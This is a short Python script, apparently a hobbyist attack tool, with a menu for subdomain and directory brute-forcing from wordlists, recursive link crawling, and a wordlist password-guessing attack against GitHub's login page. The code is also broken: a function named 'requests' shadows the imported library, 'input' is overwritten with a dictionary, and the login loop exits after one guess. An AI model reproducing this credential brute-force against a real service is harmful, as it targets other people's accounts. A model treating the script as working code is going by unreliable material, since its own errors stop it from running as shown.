import requests
import re

def requests(url):
    try:
        return requests.get("http://"+ url)
    except:
        pass

target_links=[] # it will store all the links of the website

def extract_links(url): # extract all links from a site
    try:
        response=requests.get('http://' + url)
        href_links= re.findall('(?:href=")(.*?)"', response.content)
        for link in href_links:
            if url in link:
                target_links.append(link)
                print(link)
                extract_links(link)
    
    except requests.exceptions.ConnectionError:
        pass
        

option= input('''enter the options
              1. To find the subdomains of a websites
              2. To find the Directories of a websites
              3. Extract links from a websites
              4. To login a websites like github\n''')    

if option=='1':
    url=input("enter the website name-->")

    with open("subdomain.txt", 'r') as file:
        print("****list of subdomains***\n")
        for line in file:
            line = line.strip()
            test_url = line + "." + url
            response = requests(test_url)
            if response:
                print(test_url)

elif option=='2':
    url=input("enter the website name-->")

    with open("directories.txt", 'r') as file:
        print("****list of Directories***\n")
        for line in file:
            line = line.strip()
            test_url = url + '/' + line
            response = requests(test_url)
            if response:
                print(test_url)



elif option=='3':
    url=input("enter the website name-->")
    extract_links(url)    
    
elif option=='4':
    url='github.com/login'
    input={'login':'text', 'password':'', 'commit':'submit'} # find {name:type} in login form by inspect element
    with open("word.txt", 'r') as file:
        for word in file:
            word = word.strip()
            input['password']= word
            response= requests.post(url, data=input)
            if 'Login failed' not in response.content:
                print('password found-->', word)
            exit() 

print('[+] reached end of line ')

    
